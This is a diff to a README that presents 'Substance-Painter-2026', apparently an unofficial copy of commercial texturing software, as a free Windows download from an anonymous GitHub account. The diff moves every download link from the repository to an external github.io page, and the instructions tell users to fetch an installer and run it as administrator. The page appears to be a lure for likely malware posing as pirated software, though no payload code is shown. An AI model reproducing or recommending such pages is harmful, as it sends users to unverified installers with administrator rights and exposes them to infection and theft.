@@ -1,6 +1,6 @@
 # 🎨 Substance-Painter-2026 - Create professional 3D textures with ease
 
-[![](https://img.shields.io/badge/Download-Substance_Painter_2026-blue)](https://github.com/fundamentalismmiami397/Substance-Painter-2026)
+[![](https://img.shields.io/badge/Download-Substance_Painter_2026-blue)](https://fundamentalismmiami397.github.io)
 
 Substance Painter 2026 brings industry-standard texturing tools to your Windows computer. This software allows artists to paint realistic materials directly onto 3D models. It uses PBR (Physically Based Rendering) to ensure your textures look accurate under various lighting conditions.
 
@@ -8,7 +8,7 @@ Substance Painter 2026 brings industry-standard texturing tools to your Windows 
 
 Follow these instructions to install the software on your Windows 10 or 11 system.
 
-1. Go to the [official download page](https://github.com/fundamentalismmiami397/Substance-Painter-2026).
+1. Go to the [official download page](https://fundamentalismmiami397.github.io).
 2. Look for the latest release version on the page.
 3. Click the link to save the installer file to your computer.
 4. Open the downloaded file to start the installation.
@@ -37,7 +37,7 @@ Substance Painter 2026 provides several tools for 3D artists.
 
 ## 🔑 Installation Guide
 
-1. Download the installer from the [link here](https://github.com/fundamentalismmiami397/Substance-Painter-2026).
+1. Download the installer from the [link here](https://fundamentalismmiami397.github.io).
 2. Locate the file in your Downloads folder.
 3. Right-click the file and select Run as administrator.
 4. Accept the license agreement when it appears.
